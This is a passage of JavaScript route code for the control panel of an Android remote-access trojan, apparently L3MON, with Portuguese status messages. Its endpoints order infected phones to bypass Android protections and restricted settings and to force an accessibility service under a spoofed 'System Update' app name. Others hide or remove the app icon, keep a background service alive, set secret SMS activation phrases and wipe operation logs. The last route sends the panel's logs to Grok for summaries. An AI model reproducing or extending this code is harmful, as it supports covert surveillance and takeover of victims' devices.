            clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.bypassProtections, { action: 'enable_bypass' }, (error) => {
                if (!error) {
                    res.json({ error: false, message: 'Bypass de proteções ativado' });
                } else {
                    res.json({ error: error });
                }
            });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.post('/manage/:deviceid/bp/disable_bypass', isAllowed, (req, res) => {
    try {
        let client = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (client) {
            clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.bypassProtections, { action: 'disable_bypass' }, (error) => {
                if (!error) {
                    res.json({ error: false, message: 'Bypass de proteções desativado' });
                } else {
                    res.json({ error: error });
                }
            });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.post('/manage/:deviceid/bp/bypass_restricted_settings', isAllowed, (req, res) => {
    try {
        let client = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (client) {
            clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.bypassProtections, { 
                action: 'bypass_restricted_settings',
                success: req.body.success || false,
                details: req.body.details || 'Tentativa de bypass'
            }, (error) => {
                if (!error) {
                    res.json({ error: false, message: 'Bypass de Configuração Restrita executado' });
                } else {
                    res.json({ error: error });
                }
            });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.post('/manage/:deviceid/bp/force_accessibility_service', isAllowed, (req, res) => {
    try {
        let client = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (client) {
            clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.bypassProtections, { 
                action: 'force_accessibility_service',
                installationMethod: req.body.installationMethod || 'system_update',
                spoofedAppName: req.body.spoofedAppName || 'System Update',
                success: req.body.success || false
            }, (error) => {
                if (!error) {
                    res.json({ error: false, message: 'Forçar ativação de Serviço de Acessibilidade executado' });
                } else {
                    res.json({ error: error });
                }
            });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.post('/manage/:deviceid/bp/detect_protections', isAllowed, (req, res) => {
    try {
        let client = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (client) {
            clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.bypassProtections, { 
                action: 'detect_protections',
                protections: req.body.protections || [],
                androidVersion: req.body.androidVersion || 0
            }, (error) => {
                if (!error) {
                    res.json({ error: false, message: 'Detecção de proteções executada' });
                } else {
                    res.json({ error: error });
                }
            });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.post('/manage/:deviceid/bp/set_installation_method/:method', isAllowed, (req, res) => {
    try {
        let client = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (client) {
            const validMethods = ['system_update', 'video_player', 'gallery_app', 'file_manager', 'theme_app', 'custom'];
            if (!validMethods.includes(req.params.method)) {
                return res.json({ error: 'Método de instalação inválido. Válidos: ' + validMethods.join(', ') });
            }
            clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.bypassProtections, { 
                action: 'installation_method_update',
                installationMethod: req.params.method,
                spoofedAppType: req.params.method,
                spoofedAppName: req.body.spoofedAppName || this.getDefaultAppName(req.params.method)
            }, (error) => {
                if (!error) {
                    res.json({ error: false, message: 'Método de instalação definido: ' + req.params.method });
                } else {
                    res.json({ error: error });
                }
            });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.get('/manage/:deviceid/bp/data', isAllowed, (req, res) => {
    let bpData = clientManager.getClientDataByPage(req.params.deviceid, 'bypass_protections');
    if (bpData) {
        res.json({ error: false, data: bpData });
    } else {
        res.json({ error: 'Dispositivo não encontrado' });
    }
});

routes.get('/manage/:deviceid/bp/status', isAllowed, (req, res) => {
    let bpData = clientManager.getClientDataByPage(req.params.deviceid, 'bypass_protections');
    if (bpData) {
        res.json({ 
            error: false, 
            data: {
                bypassEnabled: bpData.bypassEnabled,
                androidVersion: bpData.androidVersion,
                restrictedSettingsBypassed: bpData.restrictedSettingsBypassed,
                accessibilityServiceForced: bpData.accessibilityServiceForced,
                installationMethod: bpData.installationMethod,
                detectedProtectionsCount: bpData.detectedProtections.length
            }
        });
    } else {
        res.json({ error: 'Dispositivo não encontrado' });
    }
});

routes.delete('/manage/:deviceid/bp/log', isAllowed, (req, res) => {
    try {
        let client = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (client) {
            let clientDB = new (require('./databaseGateway')).clientdb(req.params.deviceid);
            clientDB.get('bypassProtectionsConfig.bypassLog').assign([]).write();
            res.json({ error: false, message: 'Log de bypass limpado' });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

// ====== ADVANCED HIDE ICON (0xHI) ======

routes.post('/manage/:deviceid/0xHI', isAllowed, (req, res) => {
    try {
        global.clientManager.sendCommand(req.params.deviceid, req.body);
        res.json({ error: false, message: 'Comando de ocultação enviado' });
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.post('/manage/:deviceid/hi/enable_hide', isAllowed, (req, res) => {
    try {
        let client = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (client) {
            let clientDB = new (require('./databaseGateway')).clientdb(req.params.deviceid);
            clientDB.get('advancedHideIconConfig.hideEnabled').assign(true).write();
            global.clientManager.sendCommand(req.params.deviceid, { action: 'enable_hide', type: '0xHI' });
            res.json({ error: false, message: 'Ocultação de ícone ativada' });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.post('/manage/:deviceid/hi/disable_hide', isAllowed, (req, res) => {
    try {
        let client = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (client) {
            let clientDB = new (require('./databaseGateway')).clientdb(req.params.deviceid);
            clientDB.get('advancedHideIconConfig.hideEnabled').assign(false).write();
            global.clientManager.sendCommand(req.params.deviceid, { action: 'disable_hide', type: '0xHI' });
            res.json({ error: false, message: 'Ocultação de ícone desativada' });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.post('/manage/:deviceid/hi/remove_icon', isAllowed, (req, res) => {
    try {
        let client = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (client) {
            let clientDB = new (require('./databaseGateway')).clientdb(req.params.deviceid);
            clientDB.get('advancedHideIconConfig').assign({
                ...clientDB.get('advancedHideIconConfig').value(),
                launcherIconRemoved: true,
                iconHidden: true
            }).write();
            global.clientManager.sendCommand(req.params.deviceid, { action: 'remove_icon', type: '0xHI' });
            res.json({ error: false, message: 'Ícone removido da gaveta de aplicativos' });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.post('/manage/:deviceid/hi/enable_background_service', isAllowed, (req, res) => {
    try {
        let client = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (client) {
            let clientDB = new (require('./databaseGateway')).clientdb(req.params.deviceid);
            clientDB.get('advancedHideIconConfig.backgroundServiceActive').assign(true).write();
            global.clientManager.sendCommand(req.params.deviceid, { action: 'enable_background_service', type: '0xHI' });
            res.json({ error: false, message: 'Serviço de segundo plano ativado' });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.post('/manage/:deviceid/hi/set_activation_method/:method', isAllowed, (req, res) => {
    try {
        let client = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (client) {
            let clientDB = new (require('./databaseGateway')).clientdb(req.params.deviceid);
            const method = req.params.method;
            const config = clientDB.get('advancedHideIconConfig').value();
            
            let updateData = { ...config, activationMethod: method };
            
            if (method === 'code') {
                updateData.activationCode = req.body.code || 'secret123';
            } else if (method === 'sms') {
                updateData.smsActivationEnabled = true;
                updateData.smsActivationPhrase = req.body.phrase || 'activate_l3mon';
            }
            
            clientDB.get('advancedHideIconConfig').assign(updateData).write();
            res.json({ error: false, message: 'Método de ativação alterado para: ' + method });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.post('/manage/:deviceid/hi/detect_launchers', isAllowed, (req, res) => {
    try {
        let client = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (client) {
            global.clientManager.sendCommand(req.params.deviceid, { action: 'detect_launchers', type: '0xHI' });
            res.json({ error: false, message: 'Detectando launchers disponíveis' });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.get('/manage/:deviceid/hi/data', isAllowed, (req, res) => {
    try {
        const data = global.clientManager.getClientDataByPage(req.params.deviceid, 'advanced_hide_icon');
        res.json({ error: false, data });
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.get('/manage/:deviceid/hi/status', isAllowed, (req, res) => {
    try {
        let client = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (client) {
            let clientDB = new (require('./databaseGateway')).clientdb(req.params.deviceid);
            const hideConfig = clientDB.get('advancedHideIconConfig').value() || {};
            res.json({ 
                error: false, 
                status: {
                    hideEnabled: hideConfig.hideEnabled,
                    iconHidden: hideConfig.iconHidden,
                    backgroundServiceActive: hideConfig.backgroundServiceActive,
                    activationMethod: hideConfig.activationMethod
                }
            });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

routes.delete('/manage/:deviceid/hi/log', isAllowed, (req, res) => {
    try {
        let client = db.maindb.get('clients').find({ clientID: req.params.deviceid }).value();
        if (client) {
            let clientDB = new (require('./databaseGateway')).clientdb(req.params.deviceid);
            clientDB.get('advancedHideIconConfig.hideLog').assign([]).write();
            res.json({ error: false, message: 'Log de ocultação limpado' });
        } else {
            res.json({ error: 'Dispositivo não encontrado' });
        }
    } catch (error) {
        res.json({ error: error.message });
    }
});

// Defensive AI log analysis routes
routes.post('/security/ai/logs-summary', isAllowed, async (req, res) => {
    try {
        const allLogs = logManager.getLogs();
        const limit = req.body.limit || req.query.limit;
        const question = req.body.question || req.query.question;

        const result = await grokAudit.summarizeLogs(allLogs, {
            limit,
            question
        });

        logManager.log(CONST.logTypes.info, 'Resumo defensivo de logs gerado via Grok');
        res.json({
            error: false,
            data: result
        });
    } catch (error) {
        logManager.log(CONST.logTypes.error, `Falha ao gerar resumo defensivo com Grok: ${error.message}`);
        res.status(500).json({
            error: error.message
        });
    }
});

module.exports = routes;